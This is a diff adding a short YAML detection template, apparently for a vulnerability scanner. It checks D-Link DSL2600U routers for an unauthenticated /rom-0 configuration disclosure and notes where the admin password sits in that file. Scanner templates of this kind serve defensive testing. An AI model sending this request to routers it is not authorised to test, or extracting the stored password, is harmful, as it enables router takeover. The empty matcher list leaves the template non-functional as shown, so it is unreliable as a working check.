@@ -1,0 +1,11 @@
+id: dlink-dsl2600u-rom0-disclosure
+brief:
+    title: D-Link DSL2600U - Unauthenticated rom-0 Configuration Disclosure
+    by: 0x_Akoko
+    level: high
+    about: Detected D-Link DSL2600U router was found to expose the /rom-0 binary configuration file without authentication. The file contains the admin password stored as LZS-compressed data at byte offset 85...
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/rom-0'
+      signs: []
